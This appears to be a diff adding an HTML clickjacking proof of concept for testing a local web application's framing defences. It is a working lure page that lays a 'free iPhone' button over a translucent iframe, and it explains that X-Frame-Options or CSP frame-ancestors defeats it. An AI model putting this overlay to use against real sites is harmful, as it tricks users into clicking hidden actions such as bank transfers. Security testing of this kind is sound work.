@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Free iPhone! — clickjacking PoC</title>
+  <style>
+    body { font-family: system-ui; padding: 2rem; }
+    .stage { position: relative; width: 600px; height: 400px; margin: 1rem 0; }
+    iframe {
+      position: absolute; inset: 0; width: 100%; height: 100%;
+      border: 2px solid #c00;
+      opacity: 0.3;          /* set to 0.0 in a real attack */
+    }
+    .lure {
+      position: absolute; inset: 0; display: grid; place-items: center;
+      pointer-events: none;  /* the iframe captures clicks */
+      font-size: 2rem; font-weight: bold;
+      background: rgba(255,255,0,0.5);
+    }
+    .lure button {
+      pointer-events: none;
+      font-size: 2rem; padding: 1em 2em; background: #ff0; border: 4px solid #c00;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Clickjacking proof of concept</h1>
+  <p>
+    The translucent box below is an iframe to your application. The yellow
+    "Win!" overlay sits on top. The user thinks they're clicking the prize
+    button — they're actually clicking whatever is at that position in the
+    iframe (e.g. a "Confirm transfer" button on a banking page).
+  </p>
+  <p>
+    With <code>X-Frame-Options: DENY</code> or
+    <code>Content-Security-Policy: frame-ancestors 'none'</code> in place,
+    the iframe refuses to load and this attack fails entirely.
+  </p>
+
+  <div class="stage">
+    <iframe src="http://localhost:8080/api/products/search?q=keyboard"></iframe>
+    <div class="lure">
+      <button>WIN A FREE iPHONE — CLICK HERE!</button>
+    </div>
+  </div>
+
+  <p>Open the browser console after loading this file. If the iframe
+  loaded, you'll see no errors. If it was blocked, you'll see one of:</p>
+  <pre>Refused to display 'http://localhost:8080/' in a frame because it set 'X-Frame-Options' to 'deny'.
+Refused to frame 'http://localhost:8080/' because an ancestor violates the following Content Security Policy directive: "frame-ancestors 'none'".</pre>
+</body>
+</html>
